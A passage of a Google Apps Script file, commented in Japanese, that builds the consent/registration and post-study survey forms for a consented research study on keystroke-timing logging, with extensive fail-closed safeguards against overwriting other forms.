/**
 * GSE_O1_Form_Builder.gs — O1 (R3-a・自然作業の常時収集) のフォーム 2 本を構築する。
 *
 * ============================================================================
 * ⚠️★★★ このファイルは **G1 とは別の Apps Script プロジェクト**に貼る。
 * ============================================================================
 *   ★ `GSE_G1_Form_Builder.gs` と**同じプロジェクトに置いてはならない**。
 *
 *   ⚠️ 理由は「整理のため」ではない。**事故が実際に起きているから**である:
 *     2026-08-07、Apps Script の関数セレクタの選択が反映されないまま `setupG1Forms` が走り、
 *     `buildConsentForm()` の `clearForm()` が **G1-C 説明・同意の全設問を削除**した。
 *     ★ 回答レコード 3 件は残ったが、**どの設問への答えかが失われた**
 *       (要約・個別のどちらも「回答なし」表示になった。実測)。
 *     ⚠️★★★ **Google Forms に回答の版履歴は無い。取り返しがつかない。**
 *
 *   → ★ 本ファイルは **3 段**で同じ事故を防ぐ。⚠️ どれか 1 つではなく 3 つとも要る:
 *       1. **別プロジェクト**に貼る (破壊的な関数を同居させない)
 *       2. ★ `o1AssertNotG1Form_` —— G1 のフォーム ID を**拒否する** (貼り間違いを機械で止める)
 *       3. ★ `o1AssertSafeToRebuild_` —— 回答のあるフォームは作り直さない (既定 fail-closed)
 *
 * ============================================================================
 * ★ 配備手順
 * ============================================================================
 *   ⚠️★★★ **2026-08-29 に訂正した。** 旧文は「**研究者が手で行う**。自動操作は関数
 *   セレクタに効かない」だったが、★ **実測で覆した** —— 貼り付け・関数選択・実行・
 *   スクリプト プロパティの編集は**すべて自動操作でできる**（★ 本手順 1〜7 を完走済み）。
 *   ⚠️ 旧記述の真因は **タブが不可視だったこと**（`visibilityState === "hidden"` のとき
 *   入力イベントだけが黙って落ちる）。★ 詳細は
 *   `.claude/skills/browser-verification/SKILL.md` §2.0a と
 *   `.steering/20260829-o1-builder-config-to-properties/decisions.md` D-3。
 *   ⚠️ **人の判断が要る箇所は変わらない**: OAuth の同意画面 / 破壊的関数を撃つ前の確認 /
 *   フォームの共有設定。⚠️★★ **リロードすると関数セレクタは先頭 (`setupO1Forms`) に戻る**
 *   ので、実行の直前に必ず表示を読み直すこと (★ 2026-08-07 の事故と同じ形)。
 *   1. Google Forms で **空のフォームを 2 本**作る (O1 用・G1 のものを使い回さない)。
 *   2. ⚠️★★★ **このファイルは編集しない。** ★ 設定は ⚙️ プロジェクトの設定 →
 *      **スクリプト プロパティ**に入れる (受け口 `GSE_O1_Submit.gs` と同じ規約)。
 *
 *        | キー | 値 |
 *        |---|---|
 *        | `FORM_ID_O1_CONSENT`   | O1-C の編集 URL `.../forms/d/<ここ>/edit` の `<ここ>` |
 *        | `FORM_ID_O1_SURVEY`    | O1-S の同上 |
 *        | `O1_APP_DOWNLOAD_URL`  | **O1 用の**配布フォルダ URL (⚠️ G1 のを指さない) |
 *        | `PHASE1_MGMT_SHEET_ID` | Phase1 の参加者ロスターの ID (★ 下の注記を読むこと) |
 *        | `O1_MGMT_SHEET_ID`     | ★ **O1 の登録ログ**の表の ID (⚠️ ロスターとは**別の表**・2026-09-03 追加) |
 *
 *   2b. ⚠️★★★ **`buildO1MgmtSheet()` を先に実行する** (★ 5 より前)。
 *       ★ `O1_MGMT_SHEET_ID` は未設定だと `o1ConfigProblems_()` が問題として報告するので、
 *         ⚠️ **設定しないと 4〜7 がすべて止まる** (fail-closed)。
 *       ⚠️ **配布のあとに作っても、それ以前の提出分は遡って埋まらない** (★ 追記ログなので)。
 *       ★ 実行すると「O1 登録ログ」と「O1 却下ログ」の 2 タブができる
 *         (⚠️ 却下を分けるのは、★ 認証なしの第三者が却下行を積み上げて
 *          **正規の登録の記録まで止められる**のを防ぐため)。
 *       ★ そのあと `checkO1MgmtSheet()` で書ける状態か確かめる。
 *
 *   3. ★ **なぜソースに書かないか**: ⚠️ `.gs` に貼ると、**repo のコードと Apps Script 上の
 *      コードが必ず食い違う** (★ この repo が繰り返し踏んでいる事故の型)。
 *      ⚠️ さらに配布フォルダ URL は「リンクを知る全員=閲覧者」で、その中に
 *      提出設定 (共有シークレット) が入りうるため、**追跡ファイルに置いてはならない**。
 *   4. ⚠️★★★ **`checkO1FormConfig()` を必ず実行する** (読み取り専用)。
 *      ★ 未設定と打ち間違いは**同じ症状**になるので、機械に見分けさせる。
 *   5. `setupO1Forms()` を実行 → フォーム 2 本が構築される。
 *   5b. ★ `refreshO1LinksTab()` を実行 → 運営シートの「O1 リンク集」にフォームの URL が載る
 *      (2026-10-07)。★ URL やアプリの入手先を変えたときも実行する（手で入れた欄は保つ）。
 *   6. `previewO1RegisterAckEmail()` で受付メールの文面を目で確認する
 *      (⚠️ メール送信は取り消せない)。
 *   7. `installO1ConsentTrigger()` を **一度だけ**実行 (提出 → 採番 → 受付メール)。
 *   8. ⚠️ 文面を直したら 5 ではなく **`migrateO1ConsentForm()`** を使う
 *      (★ 回答があるフォームを `setupO1Forms()` で作り直すと紐付けが失われる)。
 *
 * ============================================================================
 * ⚠️ 秘密を置かない
 * ============================================================================
 *   ★ 提出の受け口 (`GSE_O1_Submit.gs`) が持つ `FOLDER_ID` / `SHARED_SECRET` を
 *     **このファイルに書かない**。
 *   ⚠️★★★ **「シート ID は秘密ではない」は誤り**（2026-08-29 に訂正）。
 *     ★ フォーム ID は**拒否リストとして**意図的にソースへ置く（公開情報・`gate:allow-id`）が、
 *     ⚠️ **ロスターのシート ID は参加者 PII への直接ポインタ**であり、
 *     ★ スクリプト プロパティに置く（→ `o1Config_()` の注記）。
 *     ⚠️ 混同すると「シート ID は秘密じゃない」を根拠に貼り戻される。
 *
 * 関連: .steering/20260828-o1-forms-and-distribution/
 *       .steering/20260823-o1-nonkeystroke-gap-and-prereg/consent-draft-o1.md (★ 文面の上流)
 *       docs/o1-deletion-ledger.md (★ 保管上限と削除手順の正本)
 *       Form_O1/GSE_O1_Submit.gs (★ 提出の受け口・別ファイル)
 */

// ============================================================
// 設定 (★ **スクリプト プロパティ**に入れる。⚠️ このファイルは編集しない)
// ============================================================
//
// ⚠️★★★ **配備ごとに変わる値をソースに書かない** (研究者判断 2026-08-29)。
//   ★ 受け口 `GSE_O1_Submit.gs` が `FOLDER_ID` / `SHARED_SECRET` で採っている規約に揃える。
//   ★ 理由は 3 つ:
//     1. ⚠️ `.gs` に貼ると **repo のコードと Apps Script 上のコードが食い違う**
//        (★ 「直したはずが配備物に届いていない」を繰り返し生む形である)。
//     2. ⚠️ 配布フォルダ URL は「リンクを知る全員=閲覧者」で、★ その中に提出設定
//        (共有シークレット) が入りうる。→ **追跡ファイルに置いてはならない**
//        (★ `.gitignore` 逐語:「一時的に public にする運用がある」「履歴からは消せない」)。
//     3. ⚠️ ロスターの ID は **参加者 PII への直接ポインタ**である。
//
// ⚠️★★ **ここに移していないもの**は、移すと**安全装置か機械検査が壊れる**ものである:
//   - `G1_FORM_IDS_DO_NOT_TOUCH` … ★ プロパティ未設定 = **拒否リストが空** = 防波堤が黙って無効。
//   - `O1_CONTACT_*` / 保管上限 / 設問文 … ★ 同意文書との一致を `o1_form_builder_test.cjs` が照合。
//   - `O1_AUTO_SEND` / `O1_ALLOW_REBUILD_WITH_RESPONSES` … ★ fail-closed の既定値。

/**
 * スクリプト プロパティから設定を読む。★ ソースには配備固有の値を置かない。
 *
 * ⚠️ 未設定は **空文字** で返す (★ `null` を配らない)。判定は `o1ConfigProblems_()` に集約し、
 * ⚠️ **空のまま構築系を走らせない** (fail-closed)。
 */
function o1Config_() {
  var props = PropertiesService.getScriptProperties();
  return {
    // O1 用の**空フォーム 2 本**の ID。⚠️ 空のままだと fail-closed で止まる (量産防止)。
    consentFormId: String(props.getProperty("FORM_ID_O1_CONSENT") || "").trim(), // O1-C (★ 同意の正本)
    surveyFormId: String(props.getProperty("FORM_ID_O1_SURVEY") || "").trim(), // O1-S 終了後アンケート
    // ★ O1 用のアプリ配布フォルダ (⚠️ **G1 のフォルダを指さない**)。
    //   ⚠️ O1 の配布物は `o1.mode` を含み、G1 のものとは中身が違う
    //      (`experiments/20260801-controlled-friction-task/make-common-app-zip.sh --mode o1`)。
    //   ★ 空なら受付メールは止まる (fail-closed)。⚠️ 空のまま登録させると、被験者は
    //     P-ID だけ受け取ってアプリを入手できない。
    appDownloadUrl: String(props.getProperty("O1_APP_DOWNLOAD_URL") || "").trim(),
    // ★★ P-ID の採番元は **Phase1 のロスターただ 1 つ**である (研究者判断 2026-08-28: G1 と共有)。
    //   ⚠️ 2 か所で採番すると相手の最大値が見えないので**必ず衝突する**。
    //   ⚠️★★ Drive に「【非公開】GSE_Phase1_運用管理シート」が **2 つある** (2026-08-03 実測)。
    //     ✅ 1ND5HSXZ...  参加者ロスター = P006.. (現行)
    //     ❌ 12T8WU4D...  古い (⚠️ 指すと実在の P-ID と衝突する)
    //   ★ 見分け方: 「参加者ロスター」タブに P010 以降が入っているほうが正。
    //
    //   ⚠️★★★ **このキーを `O1_MGMT_SHEET_ID` に改名しない** (研究者判断 2026-08-29)。
    //     ★ 他の 3 キーが `O1_` なのは「O1 固有の実体」を指すからで、⚠️ **これだけは違う**
    //       —— 指す先は **Phase1 のロスター**であり、Phase1 / G1 / O1 の**共用**である
    //       (`docs/o1-deletion-ledger.md` §5b: P-ID↔個人の対応表はここ 1 か所)。
    //     ⚠️ `O1_` を冠すると「O1 にも固有のロスターがある」と読め、★ 新シートを作って
    //       指した瞬間に **2 か所採番**になる (⚠️ 新シートは P001 から出るので実在の
    //       P-ID と衝突する)。★ 拒否リスト `o1IsKnownWrongRoster_` は**既知の古いシート
    //       しか弾けない**ので、⚠️ **「参加者ロスター」タブを持つ新シートは黙って通る**
    //       (★ タブ名が違えば `o1OpenRoster_` が止めるが、⚠️ **危ないのはまさに
    //       「O1 用のロスターを作った」場合**であり、そこは素通りする)。
    //       → **名前が最後の防波堤**である (⚠️ 機械的な検査は未実装・起票 T-23)。
    //     ★ O1 固有の運用管理シートは**別に新設される**。その ID は 5 本目のキー
    //       `O1_MGMT_SHEET_ID` として足すこと (⚠️ G1 が `GSE_G1_MGMT_SHEET_ID` を
    //       採番元と別に持っているのと同じ形)。⚠️ **本キーを転用しない**。
    //     ⚠️★★★ **その新シートに氏名・メールを持たせない** (研究者判断 2026-08-29)。
    //       ★ **P-ID のみ**にする —— G1 が同じ問いに出した答えと同型である
    //         (`Form_G1/GSE_G1_Form_Builder.gs:124` 逐語:「本シートは **実名・メールを
    //         持たない**。実名↔P-ID の対応表を 2 か所に作らない」)。
    //       ★ メール送信に複製は要らない: 登録直後はフォーム回答の `a.email`、後日は
    //         **ロスターの C 列**から引く —— G1 の `g1EmailForPid_`
    //         (`Form_G1/GSE_G1_Form_Builder.gs:2840`) が `getRange(found.row, 3)` を返し、
    //         `:2906` の呼び出し側が `sendTaskMaterialsEmail` (`:2495`) へ渡している。
    //       ⚠️ 複製を作ると削除経路が 2 か所 → 3 か所になり、★ どれか 1 つ漏れると
    //         同意文書 §7 (削除の申し出) が履行できない。
    rosterSheetId: String(props.getProperty("PHASE1_MGMT_SHEET_ID") || "").trim(),
    // ★ 5 本目のキー = **O1 固有の運用管理シート**（★ 提出イベントの追記ログ・2026-09-03 実装）。
    //   ⚠️★★★ 上の `rosterSheetId` とは**別物**である。★ こちらは:
    //     - **採番元ではない**（⚠️ ここから P-ID を採らない）
    //     - ⚠️★★★ **氏名・メールを持たない**（★ P-ID だけ。研究者判断 2026-08-29）
    //   ★ 機械的な取り違え防止は `o1MgmtConfigProblem_` / `o1OpenMgmtLog_` に置いた
    //     （⚠️ 「参加者ロスター」タブを持つ表を指したら**書かずに止まる**）。
    mgmtSheetId: String(props.getProperty("O1_MGMT_SHEET_ID") || "").trim(),
  };
}

// ============================================================
// ⚠️★★★ G1 のフォームを**絶対に触らせない**拒否リスト
// ============================================================
// ★ ここに載っている ID を `FORM_ID_O1_*` に貼ると、構築系は 1 つも動かずに止まる。
//   ⚠️ これは「気をつける」の代わりである。2026-08-07 の事故は
//      **人間の 1 クリックのミスが同意記録を壊せる設計**そのものが原因だった。
//
// ★ フォーム ID は URL に出るので秘密ではない (`GSE_G1_Form_Builder.gs` にも同じ値がある)。
// ⚠️ G1 側のフォームを増やしたら**ここにも足す**。
var G1_FORM_IDS_DO_NOT_TOUCH = {
  // ★ gate:allow-id —— ⚠️ **この 3 本は意図的にソースへ置く**。
  //   ★ フォーム ID は URL に出るので秘密ではなく、⚠️ **拒否リストはコードと一緒に運ばれ
  //     なければ意味が無い**（プロパティ化すると未設定で防波堤が黙って無効になる）。
  "1Hs3NtuOB3IRKHaU6xspL8jd1y4BdVKFK0s4JxHTQdsE": // gate:allow-id
    "G1-C 説明・同意 (⚠️ 2026-08-07 に全設問を消した事故の当事者)",
  "1iDcr0uc_51dEEI_idyJhcozYMX02N3ug-JQ7zSVMHIA": "G1-M 強制比較", // gate:allow-id
  "1ScM_420irB8DUA8EFYyDJBaPBR-_lOa4evtveQBVWjU": "G1-S 終了後アンケート", // gate:allow-id
};

// 既存設問を毎回作り直すか (通常 true)。
var O1_CLEAR_EXISTING = true;

// ★★ 回答があるフォームを作り直してよいか (既定 false = fail-closed)。
//   ⚠️ true にすると **回答と設問の紐付けが失われる**。作業後は必ず false に戻すこと。
//   ★ 回答を保ったまま文面を更新したいときは `migrateO1ConsentForm()` を使う (削除しない)。
var O1_ALLOW_REBUILD_WITH_RESPONSES = false;

// ★ 研究責任者・所属・連絡先 (研究者判断 2026-08-28)。
//   ⚠️★★ `consent-draft-o1.md` §7 と **1 文字も違えない**。片方だけ直すと
//     同意文書とフォームで連絡先が食い違い、⚠️ **フォームのほうが正本**なので実害が出る。
var O1_CONTACT_NAME = "三浦尊統";
var O1_AFFILIATION = "ZEN大学";
var O1_CONTACT_EMAIL = "mmiura.network@gmail.com";
var O1_CONTACT = O1_CONTACT_NAME + "（" + O1_CONTACT_EMAIL + "）";

// ★ true = 受付メールを実送信する / false = **送らずに文面をログへ出すだけ**。
//   ⚠️ 送信は取り消せない。★ 文面を変えたら `previewO1RegisterAckEmail()` で先に確認する。
//   ⚠️★ O1 は**登録直後に P-ID とアプリが要る** (被験者はその日から記録を始める) ので、
//     G1 と同じく実送信を既定にする。
//
// ⚠️★★★ **`GmailApp` を使わない** (security-checker 指摘・2026-08-28)。
//   ★ Apps Script の OAuth スコープは**ソースの静的解析**で決まるため、`GmailApp` が
//     1 行でも書いてあると、実行されなくても **Gmail 全体 (`https://mail.google.com/`)**
//     の認可を要求する。⚠️ このプロジェクトの Gmail には被験者との PII 往復が入っている。
//   ★ 使うのは `MailApp`（`script.send_mail` = 送信のみ）だけにする。
//     下書きの代わりは `previewO1RegisterAckEmail()`（★ ログに出すだけ）が担う。
var O1_AUTO_SEND = true;

// ⚠️ `PHASE1_MGMT_SHEET_ID` と `O1_APP_DOWNLOAD_URL` は **スクリプト プロパティ**へ移した
//   (2026-08-29)。★ 注記は `o1Config_()` の中に置いてある。

// ★ 想定期間 (`consent-draft-o1.md` §2 の逐語と揃える)。
var O1_PERIOD_TEXT = "数日〜数週間";

// ★ 保管上限 (研究者判断 2026-08-28)。⚠️ `docs/o1-deletion-ledger.md` §5 が正本。
//   ⚠️★★ 台帳とフォームで数値が食い違うと、**フォーム (＝同意の正本) のほうが被験者への約束**に
//     なる。★ 台帳を直したらここも直す。
var O1_RETENTION_ENCRYPTED = "受け取った日から 2 年";
var O1_RETENTION_PLAINTEXT = "解析が終わってから 30 日以内";
var O1_RETENTION_METRICS = "論文発表から 5 年";  // ★ 起算点つき（台帳 §5 と一致）

// ============================================================
// ★ 設問タイトルの契約
// ============================================================
// ⚠️★★★ **構築側と回答取得側 (`o1ConsentAnswers_`) が同じ定数を読む。**
//   ★ 片方だけ変えると、提出されても氏名やメールが取れず、⚠️ **黙って発番が止まる**
//     (エラーにならないので気づきにくい)。
var Q_O1_PID = "参加者ID（お持ちの方のみ）";
var Q_O1_NAME = "お名前";
var Q_O1_EMAIL = "メールアドレス";
var Q_O1_OS = "記録に使うパソコンの種類";
/** O1-C の末尾に並ぶ登録用の設問。この順で並ぶ（照合と修復が使う）。 */
var O1_REGISTRATION_TITLES = [Q_O1_PID, Q_O1_NAME, Q_O1_EMAIL, Q_O1_OS];
/** 登録用の設問の直前に置く見出し。 */
var O1_REGISTRATION_HEADER = "ご記名";
/** パソコンの種類の選択肢。どちらの配布物を送るかがこの文字列で決まる。 */
var O1_OS_CHOICES = ["Windows", "Mac", "両方使う"];
var Q_O1_SUBJECT_ID = "参加者ID";

// ★ O1-S の設問タイトルのうち、後段の集計が語で探すもの。
var Q_O1_S_BURDEN = "記録され続けていることが気になりましたか。";
var Q_O1_S_PAUSE_USED = "「一時停止」を使いましたか。";
var Q_O1_S_DECL_REPICK = "「作業の種類」を選び直しましたか。";

// ============================================================
// 入口
// ============================================================

/**
 * ★ O1 のフォーム 2 本を構築する。
 * ⚠️ `setupG1Forms` とは**別プロジェクトの別関数**である。名前も似せていない
 *   (関数セレクタで隣り合わせにしないため)。
 */
function setupO1Forms() {
  var problems = o1ConfigProblems_();
  if (problems.length) {
    throw new Error(
      "⛔ 設定に問題があるので構築しません（fail-closed）:\n  - " +
        problems.join("\n  - ") +
        "\n\n★ `checkO1FormConfig()` を実行すると同じ内容を読み取り専用で確認できます。"
    );
  }
  buildO1ConsentForm();
  buildO1PostSurveyForm();
  Logger.log("🎉 O1 フォーム 2 本 構築完了");
  Logger.log(listO1FormUrls());
  Logger.log(
    "⚠️ ★ 次にやること: previewO1RegisterAckEmail() で文面を確認 → installO1ConsentTrigger()"
  );
}

/**
 * ★★ 読み取り専用の設定チェック。⚠️ **配備手順 4。必ず通す。**
 *
 * ⚠️★★★ なぜ要るか: 「ID が空」と「ID を打ち間違えた」と「G1 の ID を貼った」は
 *   実行してみるまで**同じ症状 (何かが失敗する)** に見える。★ 機械に見分けさせる。
 * ★ フォームを 1 バイトも変更しない。
 */
function checkO1FormConfig() {
  var problems = o1ConfigProblems_();
  if (!problems.length) {
    Logger.log("✅ 設定は揃っています。setupO1Forms() を実行できます。");
    return true;
  }
  Logger.log("❌ 設定に問題があります（" + problems.length + " 件）:");
  problems.forEach(function (p) {
    Logger.log("  - " + p);
  });
  return false;
}

/**
 * ★ 拒否リストに載っているか。⚠️ 素の `obj[id]` だと `constructor` などの
 * **プロトタイプ由来の鍵**が truthy になり、「G1 の ID です」と嘘の理由を出す
 * (fail-closed 方向なので実害は無いが、原因の分からないエラーになる)。
 */
function o1G1FormLabel_(id) {
  return Object.prototype.hasOwnProperty.call(G1_FORM_IDS_DO_NOT_TOUCH, id)
    ? G1_FORM_IDS_DO_NOT_TOUCH[id]
    : null;
}

/**
 * ⚠️★★ **古いほうの Phase1 管理シート**か（★ 拒否リスト）。
 *
 * ⚠️ Drive に「【非公開】GSE_Phase1_運用管理シート」が **2 つある**（2026-08-03 実測）。
 * ★ 古いほうを指すと**実在の P-ID と衝突する**。⚠️ 値をプロパティへ移した以上、
 * ★ 「正しいほうを選べたか」を機械で支えるのはここだけである。
 * ★ 前方一致で見るのは、⚠️ 全長をソースに書かないためである（→ 起票 T-20 / T-21）。
 */
function o1IsKnownWrongRoster_(id) {
  return String(id || "").indexOf("12T8WU4D") === 0;
}

/** 設定の問題を配列で返す。★ `checkO1FormConfig` と `setupO1Forms` が共有する。 */
function o1ConfigProblems_() {
  var cfg = o1Config_();
  var out = [];
  [
    ["FORM_ID_O1_CONSENT", cfg.consentFormId],
    ["FORM_ID_O1_SURVEY", cfg.surveyFormId],
  ].forEach(function (pair) {
    var name = pair[0];
    var id = pair[1];
    if (!id) {
      out.push(
        "スクリプト プロパティ " + name + " が空です（★ 空フォームを作って編集 URL の ID を入れる）"
      );
      return;
    }
    var g1Label = o1G1FormLabel_(id);
    if (g1Label) {
      out.push(
        "⚠️★★★ " +
          name +
          " に **G1 のフォーム ID** が入っています（" +
          g1Label +
          "）。★ O1 用の空フォームを別に作ってください。"
      );
    }
  });
  var s1Id = String(PropertiesService.getScriptProperties().getProperty("FORM_ID_S1_CONSENT") || "").trim();
  if (s1Id && (cfg.consentFormId === s1Id || cfg.surveyFormId === s1Id)) {
    out.push("FORM_ID_O1_* に段 1 の同意フォームの ID（FORM_ID_S1_CONSENT）が入っています（段 1 の同意の正本を消します）");
  }
  if (cfg.consentFormId && cfg.consentFormId === cfg.surveyFormId) {
    out.push(
      "⚠️ FORM_ID_O1_CONSENT と FORM_ID_O1_SURVEY が同じ ID です（★ 片方がもう片方を上書きします）"
    );
  }
  if (!cfg.rosterSheetId) {
    out.push(
      "スクリプト プロパティ PHASE1_MGMT_SHEET_ID が空です（★ P-ID の採番元。空だと登録しても発番できません）"
    );
  } else if (o1IsKnownWrongRoster_(cfg.rosterSheetId)) {
    // ⚠️★★★ **古いほうの管理シートを弾く**（code-reviewer MEDIUM・2026-08-29）。
    //   ★ 値をプロパティへ移した結果、⚠️ 「2 つあるうちの正しいほう」を選ぶ**機械的な支え**が
    //     消えていた（注記は残っていたが、注記は実行されない）。
    //   ★ `G1_FORM_IDS_DO_NOT_TOUCH` と同じ「拒否リスト」の形で戻す。
    out.push(
      "⚠️★★★ PHASE1_MGMT_SHEET_ID が **古いほうの管理シート**を指しています" +
        "（★ 実在の P-ID と衝突します）。★「参加者ロスター」タブに P010 以降が入っているほうが正です。"
    );
  }
  // ★ O1 固有の運用管理シート（★ 提出イベントの追記ログ）。
  //   ⚠️★★★ **構築時は fail-closed** にする —— ★ 配布**後**に作ると、
  //     それ以前の提出分が**遡って埋まらない**（★ 追記ログは過去を作れない）。
  //   ⚠️ 対して**提出時は fail-open** である（`o1LogMgmt_`）。★ ログが書けないことで
  //     被験者の登録を止めない —— ★ ログは観測器であってゲートではない。
  var mgmtProblem = o1MgmtConfigProblem_(cfg);
  if (mgmtProblem) out.push(mgmtProblem);
  if (!cfg.appDownloadUrl) {
    out.push(
      "スクリプト プロパティ O1_APP_DOWNLOAD_URL が空です（⚠️ 受付メールが止まります。★ O1 用の配布フォルダを指すこと）"
    );
  } else if (o1AppDownloadUrlIsBad_(cfg.appDownloadUrl)) {
    // ⚠️★ 打ち間違い（フォルダ ID だけを貼る等）は「未設定」と**同じ症状**になるので機械で分ける。
    out.push(
      "スクリプト プロパティ O1_APP_DOWNLOAD_URL が URL ではありません（★ https:// で始まる配布フォルダの URL を入れる）"
    );
  }
  if (!O1_CONTACT_EMAIL || O1_CONTACT_EMAIL.indexOf("@") < 0) {
    out.push("O1_CONTACT_EMAIL が不正です（★ 削除の申し出先が無いと同意文書 §7 が嘘になります）");
  }
  return out;
}

function listO1FormUrls() {
  var props = PropertiesService.getScriptProperties();
  var out = [];
  ["O1_CONSENT", "O1_SURVEY"].forEach(function (key) {
    var raw = props.getProperty("FORMURL_" + key);
    if (!raw) {
      out.push(key + ": (未生成)");
      return;
    }
    var o = JSON.parse(raw);
    out.push(key + ": " + o.label + "\n  回答: " + o.publishedUrl + "\n  編集: " + o.editUrl);
  });
  return out.join("\n");
}

// ============================================================
// ⚠️★★★ 破壊操作の関門 (★ 3 段のうちの 2 と 3)
// ============================================================

/**
 * ★ 段 2: **G1 のフォーム ID を拒否する。**
 * ⚠️ `FormApp.openById` より**前**に呼ぶこと。開いてしまってからでは遅い。
 */
function o1AssertNotG1Form_(id, varName) {
  var label = o1G1FormLabel_(id);
  if (!label) return;
  throw new Error(
    "⛔⛔⛔ " +
      varName +
      " に **G1 のフォーム ID** が入っています: " +
      label +
      "\n" +
      "★ 中止しました。O1 のビルダーは G1 のフォームに触れません。\n" +
      "⚠️ 2026-08-07 に、これと同じ取り違えで G1-C の全設問が消えています（版履歴はありません）。\n" +
      "★ O1 用の空フォームを新しく作り、その ID を貼ってください。"
  );
}

/**
 * ★ 段 3: **回答があるフォームは作り直さない。**
 * ⚠️ 回答数を確認できないときも**止める** (「確認できなかった」を「0 件」と読み替えない)。
 */
function o1AssertSafeToRebuild_(form, label) {
  var n;
  try {
    n = form.getResponses().length;
  } catch (e) {
    throw new Error(
      "★ " +
        label +
        " の回答数を確認できませんでした: " +
        e +
        "\n" +
        "⚠️ 確認できない以上、作り直しません（fail-closed）。"
    );
  }
  if (n === 0) return;

  if (O1_ALLOW_REBUILD_WITH_RESPONSES) {
    Logger.log(
      "⚠️⚠️ " +
        label +
        ": 回答が " +
        n +
        " 件あるが O1_ALLOW_REBUILD_WITH_RESPONSES=true のため作り直します。\n" +
        "   ★ この操作で **回答と設問の紐付けが失われます**。作業後は必ず false に戻してください。"
    );
    return;
  }

  throw new Error(
    "⛔ " +
      label +
      " には既に回答が " +
      n +
      " 件あります。作り直しを中止しました（fail-closed）。\n" +
      "\n" +
      "★ 回答を保ったまま文面を更新したい場合（ほぼ常にこちら）:\n" +
      "    migrateO1ConsentForm()  … 既存設問を消さず、足りない同意項目だけを足す\n" +
      "\n" +
      "⚠️ どうしても作り直す場合は O1_ALLOW_REBUILD_WITH_RESPONSES = true にしてから再実行し、\n" +
      "   ★ **回答と設問の紐付けが失われることを承知したうえで**行ってください。"
  );
}

/** ★ ID の検証 → 開く。⚠️ 順序を入れ替えない (検証が先)。 */
function o1OpenFixed_(id, varName) {
  if (!id) {
    throw new Error(
      "★ " +
        varName +
        " が空です。フォームを量産しないため停止しました。\n" +
        "先に Google Forms で**空フォーム**を作り、編集 URL\n" +
        "  https://docs.google.com/forms/d/<ここ>/edit\n" +
        "の <ここ> を " +
        varName +
        " に貼ってから再実行してください。"
    );
  }
  o1AssertNotS1Form_(id, varName);
  o1AssertNotG1Form_(id, varName);
  return FormApp.openById(id);
}

/**
 * 分岐ナビゲーションを先に解除してから末尾削除する。
 * ★ 直接 deleteItem すると go-to-page 参照が残って "Invalid data updating form" になる
 *   (G1 側で実測済みの罠。⚠️ 手順を簡略化しない)。
 */
function o1ClearForm_(form) {
  var items = form.getItems();
  for (var i = 0; i < items.length; i++) {
    var type = items[i].getType();
    try {
      if (type === FormApp.ItemType.MULTIPLE_CHOICE) {
        var mc = items[i].asMultipleChoiceItem();
        mc.setChoices(
          mc.getChoices().map(function (c) {
            return mc.createChoice(c.getValue());
          })
        );
      } else if (type === FormApp.ItemType.LIST) {
        var li = items[i].asListItem();
        li.setChoices(
          li.getChoices().map(function (c) {
            return li.createChoice(c.getValue());
          })
        );
      } else if (type === FormApp.ItemType.PAGE_BREAK) {
        items[i].asPageBreakItem().setGoToPage(FormApp.PageNavigationType.CONTINUE);
      }
    } catch (e) {
      // ナビゲーションを持たない項目はスキップ
    }
  }
  var remaining = form.getItems();
  for (var j = remaining.length - 1; j >= 0; j--) {
    form.deleteItem(remaining[j]);
  }
}

function o1AddSectionHeader_(form, title, description) {
  var section = form.addSectionHeaderItem();
  section.setTitle(title);
  if (description) section.setHelpText(description);
}

function o1RecordFormUrl_(key, form, label) {
  PropertiesService.getScriptProperties().setProperty(
    "FORMURL_" + key,
    JSON.stringify({
      label: label,
      id: form.getId(),
      title: form.getTitle(),
      editUrl: form.getEditUrl(),
      publishedUrl: form.getPublishedUrl(),
    })
  );
}

// ============================================================
// O1-C 参加登録＝説明・同意
// ============================================================
// ⚠️★★★ **このフォームの回答が同意の正本である。**
//   ★ `consent-draft-o1.md` は**配布されない雛形**であり、被験者が実際に読むのはここである。
//   ⚠️ 文面の上流は `consent-draft-o1.md`。★ **先にあちらを直してからここへ写す**
//     (このプロジェクトは「片方だけ直して食い違わせる」事故を繰り返している)。
//
// ★ G1 と同じく「参加登録フォームを別に作らない」。G1 は 2026-08-03 に
//   別立ての参加登録フォームを**重複として廃止**している。

function o1ConsentFormTitle_() {
  return "GSE O1 ふだんの作業の長期記録 — 説明・同意（参加登録）";
}

function o1ConsentFormDescription_() {
  return (
    "ご検討ありがとうございます。以下をお読みのうえ、ご回答ください。\n" +
    "★ 説明を聞いたうえで決めていただくもので、断っても不利益は一切ありません。\n\n" +
    "▼ 何を調べる研究か\n" +
    "ふだんのパソコン作業のあいだ、キーボードやマウスの「操作のしかた」だけを長い期間記録して、" +
    "「席を外していた時間」の中身が見分けられるかを調べます。\n" +
    "★ 文章の中身・画面の内容は記録しません。記録するのは「いつ・どの種類の操作をしたか」だけです。\n" +
    "⚠️ 以前にご案内した G1（70 分の課題実験）とは**まったく別の研究**です。\n\n" +
    "▼ お願いすること（期間: " +
    O1_PERIOD_TEXT +
    "）\n" +
    "・ふだんどおりに作業していただくだけです。特別な課題はありません。\n" +
    "・記録用のアプリを起動しておいていただきます。★ 参加の確認を済ませると、パソコンにログインしたときに自動で起動するよう設定されます（設定でいつでも切れます。切り方は配布フォルダの説明書【3】にあります）。★ いつでも止められます。\n" +
    "・いま何の作業をしているかを、画面の表示から 5 つの選択肢で選んでいただきます。\n" +
    "  （論述 / 通信文 / デザイン・映像・制作作業 / vibe coding / その他・細切れの作業）\n" +
    "  ★ メールを読む・調べものなど、どれとも決めづらいときは「その他・細切れの作業」を選んでください（メールを書くのは「通信文」です）。\n" +
    "  ★ 忘れても記録は続きます。選ばなくてもかまいません。\n" +
    "  ★ 何を選んでも、記録する内容は 1 つも変わりません。\n" +
    "・最後に短いアンケート（5 分ほど）にお答えいただきます。\n\n" +
    "▼ 記録するもの\n" +
    "・キーを押した「時刻」と「種類」（文字キー / バックスペース / 空白 / 改行 / 記号 など）\n" +
    "・日本語入力の変換にかかった時間\n" +
    "・貼り付けの回数と文字数（★ 中身は取得しません）\n" +
    "・画面の切り替えが起きた時刻（★ どのアプリへ切り替えたかは記録しません）\n" +
    "・マウスの「動いた量・ホイールの回数」（Windows ではさらに「押した回数」）を 1 秒ごとに数えた値\n" +
    "・キーボードの配列の種類（開始時に 1 回だけ）／アプリの版／記録がうまくいっていたかの状態\n" +
    "・この端末の導入ごとに作った乱数の識別子（16 桁・開始時に 1 回だけ）。端末や個人を特定する情報ではありません。" +
